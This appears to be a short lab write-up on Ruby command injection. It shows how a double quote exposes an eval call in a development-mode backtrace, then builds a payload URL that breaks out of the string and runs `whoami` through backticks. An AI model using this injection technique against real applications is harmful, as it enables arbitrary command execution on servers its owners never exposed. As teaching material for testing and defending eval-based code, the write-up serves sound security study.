---
language: "ruby"
exploit-type: "command-injection"
tags: ruby
---
If errors are outputted, and there is an eval vuln, we can figure it out quickly by inputting a double quote. This is an example of an error we might get:

```backtrace
### BACKTRACE

[(expand)](http://ptl-6800f32ccc39-f93e62769d14.libcurl.me/?username=hacker%22#)

**JUMP TO:** [GET](http://ptl-6800f32ccc39-f93e62769d14.libcurl.me/?username=hacker%22#get-info) [POST](http://ptl-6800f32ccc39-f93e62769d14.libcurl.me/?username=hacker%22#post-info) [COOKIES](http://ptl-6800f32ccc39-f93e62769d14.libcurl.me/?username=hacker%22#cookie-info) [ENV](http://ptl-6800f32ccc39-f93e62769d14.libcurl.me/?username=hacker%22#env-info)

- `/srv/exercise.rb` in `**eval**`
- 13. `@message = eval "\"Hello "+params['username']+"\""`
    
- `/srv/exercise.rb` in `**block in <class:Exercise>**`
- 13. `@message = eval "\"Hello "+params['username']+"\""`
    
- `/usr/local/lib/ruby/2.3.0/webrick/httpserver.rb` in `**service**`
- 140. `si.service(req, res)`
    
- `/usr/local/lib/ruby/2.3.0/webrick/httpserver.rb` in `**run**`
- 96. `server.service(req, res)`
    
- `/usr/local/lib/ruby/2.3.0/webrick/server.rb` in `**block in start_thread**`
- 296. `block ? block.call(sock) : run(sock)`
```

This gets displayed in a much nicer format btw. But we can see the word __ruby__ littered all over it. ruby

what espcially is interesting is this line:
```ruby
@message = eval "\"Hello "+params['username']+"\""
```
This is only displayed because the server is in development mode. We can see how the eval works. This can be used to break it, we have to know a few things:
- We have to close in the first string with `"`
- We have to concentrate with an encoded plus sign: `%2b`
- We have to put our command into two \` signs
- We have to close concentrate again with `%2b`
- We have to close in with `"` , to close in the string forward

A final payload might look similar to this:
```
http://url.me/?username=hacker%22%2b`whoami`%2b%22
```



